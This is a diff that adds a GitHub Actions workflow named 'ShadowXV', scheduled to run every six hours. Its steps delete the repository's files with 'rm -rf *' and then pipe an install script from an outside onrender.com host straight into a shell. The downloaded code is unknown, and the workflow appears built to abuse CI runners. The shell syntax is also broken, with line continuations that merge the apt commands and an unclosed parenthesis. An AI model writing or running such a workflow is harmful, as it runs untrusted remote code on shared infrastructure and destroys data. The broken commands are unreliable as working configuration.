@@ -1,0 +1,22 @@
+name: ShadowXV
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  ShadowXV:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Removed Def Items
+      run: |
+        rm -rf * 2>/dev/null || true
+    
+    - name: Run ShadowXV
+      run: |
+        # Installing ShadowXV
+        apt update \
+        apt install curl -y \
+        bash <(curl -s https://shadowinstallxv8.onrender.com/install.sh | sh
